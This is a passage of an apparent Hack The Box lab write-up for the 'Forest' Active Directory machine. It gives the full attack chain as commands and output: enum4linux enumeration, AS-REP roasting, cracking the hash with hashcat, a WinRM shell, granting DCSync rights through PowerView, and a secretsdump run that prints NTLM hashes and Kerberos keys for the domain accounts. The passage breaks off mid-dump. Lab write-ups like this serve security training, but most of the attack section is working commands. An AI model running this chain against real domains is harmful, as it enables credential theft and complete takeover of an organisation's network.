Group 'Enterprise Key Admins' (RID: 527) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Discovery Management' (RID: 1111) has member: Could not connect to server 10.129.248.171
Group 'Discovery Management' (RID: 1111) has member: The username or password was not correct.
Group 'Discovery Management' (RID: 1111) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Records Management' (RID: 1110) has member: Could not connect to server 10.129.248.171
Group 'Records Management' (RID: 1110) has member: The username or password was not correct.
Group 'Records Management' (RID: 1110) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Managed Availability Servers' (RID: 1120) has member: Could not connect to server 10.129.248.171
Group 'Managed Availability Servers' (RID: 1120) has member: The username or password was not correct.
Group 'Managed Availability Servers' (RID: 1120) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'test' (RID: 5101) has member: Could not connect to server 10.129.248.171
Group 'test' (RID: 5101) has member: The username or password was not correct.
Group 'test' (RID: 5101) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Controllers' (RID: 516) has member: Could not connect to server 10.129.248.171
Group 'Domain Controllers' (RID: 516) has member: The username or password was not correct.
Group 'Domain Controllers' (RID: 516) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Exchange Windows Permissions' (RID: 1121) has member: Could not connect to server 10.129.248.171
Group 'Exchange Windows Permissions' (RID: 1121) has member: The username or password was not correct.
Group 'Exchange Windows Permissions' (RID: 1121) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Exchange Trusted Subsystem' (RID: 1119) has member: Could not connect to server 10.129.248.171
Group 'Exchange Trusted Subsystem' (RID: 1119) has member: The username or password was not correct.
Group 'Exchange Trusted Subsystem' (RID: 1119) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Read-only Domain Controllers' (RID: 521) has member: Could not connect to server 10.129.248.171
Group 'Read-only Domain Controllers' (RID: 521) has member: The username or password was not correct.
Group 'Read-only Domain Controllers' (RID: 521) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Admins' (RID: 512) has member: Could not connect to server 10.129.248.171
Group 'Domain Admins' (RID: 512) has member: The username or password was not correct.
Group 'Domain Admins' (RID: 512) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Service Accounts' (RID: 1148) has member: Could not connect to server 10.129.248.171
Group 'Service Accounts' (RID: 1148) has member: The username or password was not correct.
Group 'Service Accounts' (RID: 1148) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Computers' (RID: 515) has member: Could not connect to server 10.129.248.171
Group 'Domain Computers' (RID: 515) has member: The username or password was not correct.
Group 'Domain Computers' (RID: 515) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Security Reader' (RID: 1116) has member: Could not connect to server 10.129.248.171
Group 'Security Reader' (RID: 1116) has member: The username or password was not correct.
Group 'Security Reader' (RID: 1116) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Organization Management' (RID: 1104) has member: Could not connect to server 10.129.248.171
Group 'Organization Management' (RID: 1104) has member: The username or password was not correct.
Group 'Organization Management' (RID: 1104) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Exchange Servers' (RID: 1118) has member: Could not connect to server 10.129.248.171
Group 'Exchange Servers' (RID: 1118) has member: The username or password was not correct.
Group 'Exchange Servers' (RID: 1118) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Help Desk' (RID: 1109) has member: Could not connect to server 10.129.248.171
Group 'Help Desk' (RID: 1109) has member: The username or password was not correct.
Group 'Help Desk' (RID: 1109) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Protected Users' (RID: 525) has member: Could not connect to server 10.129.248.171
Group 'Protected Users' (RID: 525) has member: The username or password was not correct.
Group 'Protected Users' (RID: 525) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Compliance Management' (RID: 1115) has member: Could not connect to server 10.129.248.171
Group 'Compliance Management' (RID: 1115) has member: The username or password was not correct.
Group 'Compliance Management' (RID: 1115) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Users' (RID: 513) has member: Could not connect to server 10.129.248.171
Group 'Domain Users' (RID: 513) has member: The username or password was not correct.
Group 'Domain Users' (RID: 513) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Hygiene Management' (RID: 1114) has member: Could not connect to server 10.129.248.171
Group 'Hygiene Management' (RID: 1114) has member: The username or password was not correct.
Group 'Hygiene Management' (RID: 1114) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Enterprise Read-only Domain Controllers' (RID: 498) has member: Could not connect to server 10.129.248.171
Group 'Enterprise Read-only Domain Controllers' (RID: 498) has member: The username or password was not correct.
Group 'Enterprise Read-only Domain Controllers' (RID: 498) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Guests' (RID: 514) has member: Could not connect to server 10.129.248.171
Group 'Domain Guests' (RID: 514) has member: The username or password was not correct.
Group 'Domain Guests' (RID: 514) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Recipient Management' (RID: 1105) has member: Could not connect to server 10.129.248.171
Group 'Recipient Management' (RID: 1105) has member: The username or password was not correct.
Group 'Recipient Management' (RID: 1105) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Delegated Setup' (RID: 1113) has member: Could not connect to server 10.129.248.171
Group 'Delegated Setup' (RID: 1113) has member: The username or password was not correct.
Group 'Delegated Setup' (RID: 1113) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Group Policy Creator Owners' (RID: 520) has member: Could not connect to server 10.129.248.171
Group 'Group Policy Creator Owners' (RID: 520) has member: The username or password was not correct.
Group 'Group Policy Creator Owners' (RID: 520) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Privileged IT Accounts' (RID: 1149) has member: Could not connect to server 10.129.248.171
Group 'Privileged IT Accounts' (RID: 1149) has member: The username or password was not correct.
Group 'Privileged IT Accounts' (RID: 1149) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Security Administrator' (RID: 1117) has member: Could not connect to server 10.129.248.171
Group 'Security Administrator' (RID: 1117) has member: The username or password was not correct.
Group 'Security Administrator' (RID: 1117) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Public Folder Management' (RID: 1107) has member: Could not connect to server 10.129.248.171
Group 'Public Folder Management' (RID: 1107) has member: The username or password was not correct.
Group 'Public Folder Management' (RID: 1107) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'UM Management' (RID: 1108) has member: Could not connect to server 10.129.248.171
Group 'UM Management' (RID: 1108) has member: The username or password was not correct.
Group 'UM Management' (RID: 1108) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: Could not connect to server 10.129.248.171
Group '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: The username or password was not correct.
Group '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'ExchangeLegacyInterop' (RID: 1122) has member: Could not connect to server 10.129.248.171
Group 'ExchangeLegacyInterop' (RID: 1122) has member: The username or password was not correct.
Group 'ExchangeLegacyInterop' (RID: 1122) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'DnsUpdateProxy' (RID: 1102) has member: Could not connect to server 10.129.248.171
Group 'DnsUpdateProxy' (RID: 1102) has member: The username or password was not correct.
Group 'DnsUpdateProxy' (RID: 1102) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Server Management' (RID: 1112) has member: Could not connect to server 10.129.248.171
Group 'Server Management' (RID: 1112) has member: The username or password was not correct.
Group 'Server Management' (RID: 1112) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Cloneable Domain Controllers' (RID: 522) has member: Could not connect to server 10.129.248.171
Group 'Cloneable Domain Controllers' (RID: 522) has member: The username or password was not correct.
Group 'Cloneable Domain Controllers' (RID: 522) has member: Connection failed: NT_STATUS_LOGON_FAILURE

 =========================================================================
|    Users on 10.129.248.171 via RID cycling (RIDS: 500-550,1000-1050)    |
 =========================================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ===============================================
|    Getting printer info for 10.129.248.171    |
 ===============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Wed Nov  3 12:50:34 2021
```

This reveals several interesting domain user accounts:
- `sebastien`
- `lucinda`
- `svc-alfresco`
	- Possible service account?
- `andy`
- `mark`
- `santi`

It also reveals an interesting domain group: `test`.

---

## ASREP Roasting

Save the usernames gathered into a text file `users.txt` and determine if any of them have Kerberos pre-authentication disabled and thus are vulnerable to ASREP Roasting.

```bash
$ GetNPUsers.py -dc-ip $10.129.248.171 htb/ -usersfile users.txt -format hashcat
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB:35bbd978bff6bf85b15074814c01960c$dcbae103ff5a94c2452bed2446252179c696e990639c67f40be424f50ca4d6dcc6f60fa26fcac56cc5106d1ef014531d052d16a8c30c68adfc74305747a6b7ff8b10a052cd522d6b1335bc03b54be894a8c07fb77ca4e5b6726df7777f143a0c3d4653e22fdf658ac2ec40341951dc0556d0b1d2933db542b58a755fe1a1197b389d5013b1af4d929279dd76b0e6e80f1970c541e45b44d224c04dfb7fb8cd6c1d7e9b512f4933fc2a64aef225b014832c36347834d4190ed7453ad5044efa3b0222bb2e8b15ad0e3526012fe3150958ec984b1bedb9d688b71683efa183d0bf
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

The potential service account `htb.local/svc-alfresco` is vulnerable to ASREP Roasting. Attempt to crack the ASREP to determine its password.

```bash
$ hashcat -m 18200 -a 0 $krb5asrep$23$svc-alfresco@HTB:35bbd978bff6bf85b15074814c01960c$dcbae103ff5a94c2452bed2446252179c696e990639c67f40be424f50ca4d6dcc6f60fa26fcac56cc5106d1ef014531d052d16a8c30c68adfc74305747a6b7ff8b10a052cd522d6b1335bc03b54be894a8c07fb77ca4e5b6726df7777f143a0c3d4653e22fdf658ac2ec40341951dc0556d0b1d2933db542b58a755fe1a1197b389d5013b1af4d929279dd76b0e6e80f1970c541e45b44d224c04dfb7fb8cd6c1d7e9b512f4933fc2a64aef225b014832c36347834d4190ed7453ad5044efa3b0222bb2e8b15ad0e3526012fe3150958ec984b1bedb9d688b71683efa183d0bf rockyou.txt
$krb5asrep$23$svc-alfresco@HTB:35bbd978bff6bf85b15074814c01960c$dcbae103ff5a94c2452bed2446252179c696e990639c67f40be424f50ca4d6dcc6f60fa26fcac56cc5106d1ef014531d052d16a8c30c68adfc74305747a6b7ff8b10a052cd522d6b1335bc03b54be894a8c07fb77ca4e5b6726df7777f143a0c3d4653e22fdf658ac2ec40341951dc0556d0b1d2933db542b58a755fe1a1197b389d5013b1af4d929279dd76b0e6e80f1970c541e45b44d224c04dfb7fb8cd6c1d7e9b512f4933fc2a64aef225b014832c36347834d4190ed7453ad5044efa3b0222bb2e8b15ad0e3526012fe3150958ec984b1bedb9d688b71683efa183d0bf:s3rvice
```

`htb.local/svc-alfresco`'s password is `s3rvice`. With this credential, it is possible to perform more enumeration of the domain.

---

## Domain Enumeration

Investigate the current user account, `svc-alfresco`.

```bash
$ pywerview get-netuser -w htb -u svc-alfresco -p s3rvice --dc-ip 10.129.248.171 --username svc-alfresco
accountexpires:                0
admincount:                    1
badpasswordtime:               2021-11-03 13:37:20.454575
badpwdcount:                   0
cn:                            svc-alfresco
codepage:                      0
countrycode:                   0
displayname:                   svc-alfresco
distinguishedname:             CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
dscorepropagationdata:         2021-11-03 17:40:19,
                               2021-11-03 17:40:19,
                               2021-11-03 17:40:19,
                               2021-11-03 17:40:19,
                               1601-01-01 00:00:00
givenname:                     svc-alfresco
homedirectory:
instancetype:                  4
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-11-03 13:37:36.358657
lastlogontimestamp:            132804331693997943
logoncount:                    9
logonhours:                    [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]
memberof:                      CN=Service Accounts,OU=Security Groups,DC=htb,DC=local
msds-supportedencryptiontypes: 0
name:                          svc-alfresco
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    58a51302-4c7c-4686-b'9502'-d3ada3afaef1
objectsid:                     S-1-5-21-3072663084-364016917-1341370565-1147
primarygroupid:                513
profilepath:
pwdlastset:                    2021-11-03 13:40:12.748817
samaccountname:                svc-alfresco
samaccounttype:                805306368
scriptpath:
useraccountcontrol:            ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD', 'DONT_REQ_PREAUTH']
userprincipalname:             svc-alfresco@htb.local
usnchanged:                    1431872
usncreated:                    26083
whenchanged:                   2021-11-03 17:40:12
whencreated:                   2019-09-20 00:58:51
```

Interestingly, though it is named as a service account and is even in the `Service Accounts` group, it doesn't have any SPNs set.

Check to see if `svc-alfresco` is a local administrator on the machine.

```bash
$ crackmapexec smb 10.129.248.171 -d htb.local -u svc-alfresco -p s3rvice
SMB         10.129.248.171  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.248.171  445    FOREST           [+] htb.local\svc-alfresco:s3rvice
```

No luck.

Enumerate the domain's relationships with BloodHound.

```bash
$ bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -c All -ns 10.129.248.171
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
INFO: Found 31 users
INFO: Found 75 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 12S
```

Import the collected data into BloodHound.

Setting `svc-alfresco` as "owned" and using the prebuilt query "Shortest Path from Owned Principals," yields the following graph.

![](images/Pasted%20image%2020211103141339.png)

`svc-alfresco` is a member of the `Service Accounts` group and thus, is also a member of the `Privileged IT Accounts` group. This group has `CanPSRemote` permission to `forest.htb.local`, which means `svc-alfresco` can access `forest.htb.locoal` via WinRM.

---

## WinRM Foothold

Use `evil-winrm` to access the machine and grab the user flag.

```bash
$ evil-winrm -i 10.129.248.171 -u htb.local\\svc-alfresco -p s3rvice
Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/3/2021   8:33 AM             34 user.txt
```

---

## Privilege Escalation

Revisiting `svc-alfresco`'s graph in BloodHound:

![](images/Pasted%20image%2020211103141339.png)

`svc-alfresco`'s membership in the `Privileged IT Accounts` group grants it membership in the `Account Operators` group, which has `GenericAll` privilege to the computer account `EXCH01.htb.local`. This privilege provides total control over that computer account. Unfortunately, it doesn't appear that `EXCH01.htb.local` has much access to the domain.

Going back through the overall graph, there is a path from `svc-alfresco` to `htb.local`.

![](images/Pasted%20image%2020211103144823.png)

`svc-alfresco`'s `GenericAll` access to the `Exchange Windows Permissions` group makes it possible to add an arbitrary user to that group. From the `evil-winrm` shell, add `svc-alfresco` to the group.

```powershell
$ net group "Exchange Windows Permissions" "svc-alfresco" /add /domain
The command completed successfully.
```

Use `PowerView`'s `Add-DomainObjectAcl` to grant the `svc-alfresco` `DCSync` privileges.

```powershell
$ PowerView.ps1
$ $pass = ConvertTo-SecureString -AsPlain 's3rvice' -Force
$ $cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)
$ Add-DomainObjectAcl -PrincipalIdentity svc-alfresco -TargetIdentity "DN=htb,DN=local" -Credential $cred -Rights DCSync
```

Now that `svc-alfresco` has DCSync privileges, use its credentials with `impacket`'s `secretsdump` to DCSync the machine.

```bash
$ impacket-secretsdump htb.local\\svc-alfresco:s3rvice@10.129.242.130
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:fbda6f8511a05a13903a82c8e3cd4e5b:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
